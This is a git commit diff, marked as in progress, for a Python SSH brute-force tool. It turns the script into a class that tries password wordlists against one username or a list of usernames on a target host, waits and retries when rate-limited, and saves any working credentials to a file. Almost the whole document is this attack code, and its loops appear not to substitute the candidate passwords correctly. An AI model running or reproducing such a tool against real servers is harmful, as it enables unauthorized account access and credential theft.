fa0e34e5e37986fb986748f0740bd55a419bff3c
aisikawaa <alterthemadness@outlook.com>
2020-12-28 00:42:30 +0900

    In progress.

--- SSHBruteForce.py
+++ SSHBruteForce.py
@@ -12,62 +12,104 @@ RESET = Fore.RESET
 BLUE = Fore.BLUE
 
 
-def ssh_checker(hostname, username, password, port):
-    c = SSHClient()
-    c.set_missing_host_key_policy(AutoAddPolicy())
-    try:
-        c.connect(hostname=hostname, username=username, password=password, port=port)
-    except socket.timeout:
-        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
-        return False
-    except AuthenticationException:
-        print(f"[!] Invalid credentials for {username}:{password}")
-        return False
-    except SSHException:
-        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
-        time.sleep(60)
-        return ssh_checker(hostname, username, password)
-    else:
-        print(
-            f"{GREEN}[+] Found combination: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n"
-            f"\tPASSWORD: {password}{RESET} "
-        )
-        return True
+class SSHBruteForce:
+    """"""
 
+    def __init__(self, hostname, username, password, port):
+        """Constructor for SSHConnect"""
+        self.hostname = hostname
+        self.username = username
+        self.password = password
+        self.port_num = port
+        self.password_list = []
+        self.username_list = []
 
-def single_target_mode(plist, host, user, port):
-    with open(plist) as read_list:
-        take_from_list = read_list.read().splitlines()
+    def ssh_checker(self):
+        c = SSHClient()
+        c.set_missing_host_key_policy(AutoAddPolicy())
+        try:
+            c.connect(
+                hostname=self.hostname,
+                username=self.username,
+                password=self.password,
+                port=self.port_num,
+            )
+        except socket.timeout:
+            print(f"{RED}[!] Host: {self.hostname} is unreachable, timed out.{RESET}")
+            return False
+        except AuthenticationException:
+            print(f"[!] Invalid credentials for {self.username}:{self.password}")
+            return False
+        except SSHException:
+            print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
+            time.sleep(60)
+            return self.ssh_checker()
+        else:
+            print(
+                f"{GREEN}[+] Found combination: \n\tHOSTNAME: {self.hostname}\n\tUSERNAME: {self.username}\n"
+                f"\tPASSWORD: {self.password}{RESET} "
+            )
+            return True
 
-    for password in take_from_list:
-        if ssh_checker(password, host, user, port):
-            with open("credential_pairs.txt", "w") as w:
-                w.write(f"{user}@{host}: {password}")
-                break
+    def single_target_mode(self):
+        for password in self.password_list:
+            if SSHBruteForce.ssh_checker(self):
+                with open("credential_pairs.txt", "w") as w:
+                    w.write(f"{self.username}@{self.hostname}: {password}")
+                    break
+
+    def multiple_target_mode(self):
+        for target_user in self.username_list:
+            for password in self.password_list:
+                if SSHBruteForce.ssh_checker(self):
+                    with open("credential_pairs.txt", "w") as w:
+                        w.write(f"{target_user}@{self.hostname}: {password}")
+                        break
+
+    def read_password_list(self):
+        with open(self.password) as rpass:
+            self.password_list = rpass.read().splitlines()
+
+    def read_username_list(self):
+        with open(self.username) as ruser:
+            self.username_list = ruser.read().splitlines()
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="SSH Bruteforce script.")
+    subparser = parser.add_subparsers()
     parser.add_argument("host", help="Hostname or IP Address of SSH Server.")
     parser.add_argument(
-        "-w", "--passlist", help="File that contain password list in each line."
+        "-p", dest="port", help="SSH port number.(default port number 22)", default=22
     )
-    parser.add_argument(
-        "-U", "--userlist", help="File that contain username list in each line."
-    )
-    parser.add_argument("-u", "--user", help="Login username")
-    parser.add_argument("-p", "--port", help="SSH port number")
-    parser.add_argument(
-        "-s",
-        "--singletarget",
+
+    single_target = subparser.add_parser(
+        "single",
         help="Brute force attack against one specified user name.",
     )
-    parser.add_argument(
-        "-m", "--mutlipletarget", help="Brute force attack against listed users."
+    single_target.add_argument("-u", dest="user", help="Login username.")
+    single_target.add_argument(
+        "-w",
+        dest="passlist",
+        help="Select the file that contains the password candidate.",
+    )
+    multi_target = subparser.add_parser(
+        "multi", help="Brute force attack against listed users."
+    )
+    multi_target.add_argument(
+        "-w",
+        dest="passlist",
+        help="Select the file that contains the password candidate.",
+    )
+    multi_target.add_argument(
+        "-U",
+        dest="userlist",
+        help="Select the file that contains the username candidate.",
     )
 
     args = parser.parse_args()
     hostIP = args.host
     pass_list = args.passlist
+    user_list = args.userlist
     user_name = args.user
     port_num = args.port
